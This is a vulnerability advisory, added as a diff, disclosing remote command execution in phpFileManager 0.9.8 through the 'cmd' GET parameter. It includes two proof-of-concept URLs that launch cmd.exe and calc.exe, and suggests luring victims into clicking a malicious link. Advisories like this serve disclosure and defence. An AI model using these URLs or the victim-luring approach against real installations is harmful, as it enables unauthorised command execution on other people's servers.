@@ -1,0 +1,115 @@
+# Exploit Title: Remote Command Execution
+# Google Dork: intitle: PHP Remote Command Execution
+# Date: 2015-07-28
+# Exploit Author:  John Page ( hyp3rlinx )
+# Website: hyp3rlinx.altervista.org
+# Vendor Homepage: phpfm.sourceforge.net
+# Software Link:  phpfm.sourceforge.net
+# Version: 0.9.8
+# Tested on: windows 7 SP1
+# Category: Webapps
+
+
+
+Vendor:
+================================
+phpfm.sourceforge.net
+
+
+
+Product:
+================================
+phpFileManager version 0.9.8
+
+
+Vulnerability Type:
+========================
+Remote Command Execution
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Advisory Information:
+=======================================================
+Remote Command Execution Vulnerability
+
+
+
+
+Vulnerability Details:
+=====================
+PHPFileManager is vulnerable to remote command execution
+and will call operating system commands via GET requests
+from a victims browser. By getting the victim to click our malicious link
+or visit our malicious website.
+
+
+
+
+Exploit code(s):
+===============
+
+
+Remote Command Execution:
+-------------------------
+
+1- call Windows cmd.exe
+
+https://localhost/phpFileManager-0.9.8/index.php?action=6&current_dir=C:/xampp/htdocs/phpFileManager-0.9.8/&cmd=c%3A\Windows\system32\cmd.exe
+<https://localhost/phpFileManager-0.9.8/index.php?action=6&current_dir=C:/xampp/htdocs/phpFileManager-0.9.8/&cmd=c%3A%5CWindows%5Csystem32%5Ccmd.exe>
+
+2- Run Windows calc.exe
+
+https://localhost/phpFileManager-0.9.8/index.php?action=6&current_dir=C:/xampp/htdocs/phpFileManager-0.9.8/&cmd=c%3A\Windows\system32\calc.exe
+<https://localhost/phpFileManager-0.9.8/index.php?action=6&current_dir=C:/xampp/htdocs/phpFileManager-0.9.8/&cmd=c%3A%5CWindows%5Csystem32%5Ccalc.exe>
+
+
+
+Disclosure Timeline:
+=========================================================
+
+Vendor Notification:  NA
+July 28, 2015 : Public Disclosure
+
+
+
+Severity Level:
+=========================================================
+High
+
+
+
+Description:
+==========================================================
+
+
+Request Method(s):          [+] GET
+
+
+Vulnerable Product:         [+]  phpFileManager  0.9.8
+
+
+Vulnerable Parameter(s):    [+] 'cmd'= [OS command]
+
+
+Affected Area(s):           [+] Operating System
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+
+by hyp3rlinx
